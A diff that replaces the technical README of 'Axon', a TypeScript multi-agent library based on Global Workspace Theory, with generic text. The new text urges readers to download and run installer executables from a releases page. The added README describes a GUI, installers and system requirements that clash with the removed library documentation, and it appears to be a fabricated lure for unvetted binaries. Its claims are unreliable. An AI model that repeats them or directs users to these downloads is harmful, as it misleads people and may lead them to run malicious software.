@@ -1,199 +1,94 @@
-# 🧠 Axon
+# 🤖 axon - Build Intelligent Systems Easily
 
-**Axon is an emergent cognitive architecture for multi-agent systems based on Global Workspace Theory.**
+## 🚀 Getting Started
 
-```typescript
-import { Axon } from "axon-ai";
+Welcome to axon! This application helps you create intelligent systems based on cognitive architecture. It's designed for anyone interested in artificial intelligence without needing deep technical skills. 
 
-const axon = new Axon({
-    llm: {
-        baseUrl: "http://localhost:1234/v1",
-        model: "qwen/qwen3-4b-2507",
-        embeddingModel: "text-embedding-nomic-embed-text-v1.5",
-        temperature: 0.7,
-        provider: "lmstudio",
-    },
-});
+## 📥 Download Now
 
-const result = await axon.process("Brainstorm sustainable energy solutions");
+[![Download axon](https://img.shields.io/badge/download-axon-brightgreen)](https://github.com/ounissi-meriem/axon/releases) 
 
-console.log(result.finalBroadcast);
-```
+## 🔍 About axon
 
-## 🌟 Features
+axon is a self-organizing cognitive architecture based on Global Workspace Theory. This framework allows you to manage multiple agents that can work together to solve complex tasks. It's ideal for projects in artificial intelligence, cognitive architecture, and natural language processing.
 
--   **Self-organizing** - No predefined workflows or hardcoded agent interactions
--   **Emergent cognition** - Thoughts compete for attention in a shared workspace
--   **Flexible configuration** - Use any LLM provider (OpenAI, local, etc.)
--   **Dynamic specialists** - Meta-agent creates specialists tailored to each problem
--   **Streaming support** - Real-time observation of the cognitive process
+## 💻 System Requirements
 
-## 🚀 Installation
+To use axon effectively, your computer should meet the following requirements:
 
-```bash
-yarn add axon-ai
-# or
-pnpm add axon-ai
-```
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** Intel i3 or equivalent
+- **RAM:** Minimum 4GB 
+- **Disk Space:** At least 200MB free 
 
-## 🧩 Core Concepts
+## 📦 Features
 
--   **ThoughtChunk**: The fundamental data unit with content, embeddings, activation energy, and lineage
--   **Workspace**: An active medium managing ThoughtChunks, decay, and cluster detection
--   **Agents**: Specialist processing units with specific roles and prompts
--   **Meta-Agent**: Analyzes the initial prompt and spawns appropriate specialist agents
--   **Orchestrator**: Manages cognitive cycles and the broadcast mechanism
+axon offers a range of features designed to simplify the development of intelligent systems:
 
-## 📐 Architecture
+- **Multi-Agent Support:** Manage several agents that can communicate and collaborate.
+- **User-Friendly Interface:** Easy navigation for users of all skill levels.
+- **Integration with Large Language Models:** Enhance your agents' capabilities using advanced language processing.
+- **Customizable Architecture:** Adapt axon to your specific needs and projects.
 
-The system operates in cognitive cycles:
+## 📦 Download & Install
 
-1. User provides an initial prompt
-2. Meta-Agent defines specialist agents needed
-3. Each cycle:
-    - Agents receive the most active ThoughtChunks
-    - Agents generate new thoughts
-    - New thoughts are added to the Workspace
-    - All thoughts decay in energy
-    - High-energy clusters trigger a broadcast
-4. Process continues for a defined number of cycles
+To get started with axon, follow these steps:
 
-## 📚 Usage
+1. **Visit the Releases Page:** Click on this link to go to our releases page: [Download axon](https://github.com/ounissi-meriem/axon/releases).
+  
+2. **Select the Latest Version:** Look for the latest release at the top of the page and click it.
 
-### Basic Example
+3. **Download the Installer:** On the release page, you will find various files. Download the installer that matches your operating system. Common options include:
+   - For Windows: `axon-windows-installer.exe`
+   - For macOS: `axon-macos-installer.zip`
+   - For Linux: A corresponding `.tar.gz` file.
 
-```typescript
-import { Axon } from "axon-ai";
+4. **Install the Application:** Once the download is complete, open the file. Follow the prompts to install axon on your computer.
 
-// Create a new Axon instance with custom config
-const axon = new Axon({
-    llm: {
-        apiKey: "your-api-key", // Not needed for local LLMs
-        baseUrl: "https://api.openai.com/v1",
-        model: "gpt-4o",
-        embeddingModel: "text-embedding-3-large",
-    },
-});
+5. **Run axon:** After installation, locate the axon application on your device and double-click to run it.
 
-// Process a prompt
-async function main() {
-    const result = await axon.process(
-        "Design a sustainable transportation system",
-        { verbose: true },
-    );
+## 📚 User Guide
 
-    console.log(result.finalBroadcast);
-    console.log(`Total thoughts: ${result.thoughts.length}`);
-}
+Once axon is installed, you can access various features with ease. Here’s a brief overview of how to use axon:
 
-main();
-```
+1. **Create a New Project:** Click on "New Project" on the main screen. This will start an assistant to help you set up your first intelligent agent.
 
-### Local LLM Example
+2. **Select Agent Type:** Choose from predefined agent types or create a custom one based on your project's needs.
 
-```typescript
-// Using a local LLM server (LM Studio, Ollama, etc.)
-const axon = new Axon({
-    llm: {
-        baseUrl: "http://localhost:1234/v1",
-        model: "mistralai/mixtral-8x7b-instruct",
-        provider: "lmstudio",
-    },
-});
+3. **Define Goals:** Set the objectives for your agents. What do you want your system to achieve? 
 
-const result = await axon.process("Analyze quantum computing impacts");
-```
+4. **Test and Run:** Once your agents are set up, run the simulation to see how they work together.
 
-## ⚙️ Configuration
+5. **Adjust Settings:** Use the settings panel to fine-tune your agents’ behaviors according to your requirements.
 
-Axon can be fully configured through code:
+## ⚙️ Troubleshooting
 
-```typescript
-const axon = new Axon({
-    llm: {
-        apiKey: "sk-...",
-        baseUrl: "https://api.openai.com/v1",
-        model: "gpt-4o",
-        embeddingModel: "text-embedding-3-large",
-        temperature: 0.7,
-        provider: "openai",
-    },
-    context: {
-        maxContextTokens: 32000,
-        bufferTokens: 2000,
-    },
-    workspace: {
-        decayRate: 0.95,
-        activationThreshold: 7.0,
-        baseActivationEnergy: 1.0,
-        maxResonanceFactor: 2.0,
-    },
-    orchestrator: {
-        maxCycles: 10,
-        broadcastThreshold: 10.0,
-    },
-});
-```
+If you encounter issues while using axon, consider the following common solutions:
 
-## 📄 Advanced Features
+- **Installation Issues:** Ensure you have the correct installer for your operating system. Check for any system requirements that may not be met.
+  
+- **Performance Problems:** Make sure no other heavy applications are running simultaneously. Close unnecessary programs to free up resources.
 
-### Custom Event Handlers
+- **Error Messages:** Note any error messages you receive. Searching for these online can lead you to solutions shared by other users.
 
-```typescript
-// Listen for specific events
-axon.on("broadcast", (broadcast) => {
-    console.log("New broadcast synthesized:", broadcast);
-});
+## 📝 Community and Support
 
-axon.on("agentThought", (agent, thought) => {
-    console.log(`Agent ${agent} thinking: ${thought}`);
-});
-```
+Join our community for support and collaboration:
 
-### Streaming Results
+- **GitHub Issues:** If you encounter bugs or need help, visit the [issues page](https://github.com/ounissi-meriem/axon/issues). 
 
-```typescript
-const result = await axon.processWithStreaming(
-    "Analyze the implications of quantum computing",
-);
-```
+- **Discussion Forum:** Engage with other axon users in our forum. Share your projects, ask questions, and offer support to others.
 
-### Advanced Workspace Manipulation
+## ✏️ Contributing
 
-```typescript
-// Access the workspace directly
-const workspace = axon.getWorkspace();
-
-// Add custom thoughts
-workspace.createChunk(
-    "Important insight to consider",
-    undefined,
-    "custom-source",
-    [],
-);
-
-// Get most active thoughts
-const activeThoughts = workspace.getMostActiveChunks(5);
-```
-
-## 🧪 Examples
-
-The package includes several examples demonstrating different usage scenarios:
-
-```bash
-# Run the basic example
-yarn example:basic
-
-# Run the advanced example with events and streaming
-yarn example:advanced
-```
-
-Check the [examples directory](./examples/) for more detailed examples and documentation.
-
-## 🔬 Research & Theory
-
-Axon implements Global Workspace Theory (GWT) as proposed by Bernard Baars and further developed by Stan Franklin in the LIDA cognitive architecture. GWT suggests that consciousness emerges from a competition among specialized cognitive processes, with winners being "broadcast" globally to the entire system.
+We welcome contributions! If you are interested in improving axon or adding features, please check our contribution guidelines. Your input can help make axon even better.
 
 ## 📜 License
 
-MIT
+axon is open-source and free to use. For more information, please refer to the license file included in the repository.
+
+## 🎉 Next Steps
+
+Once you're comfortable with axon, explore advanced features like integrating external APIs or developing specialized agents. The potential for creating intelligent systems is vast. Happy building!
+
+[Download axon](https://github.com/ounissi-meriem/axon/releases) and start your journey into artificial intelligence today!
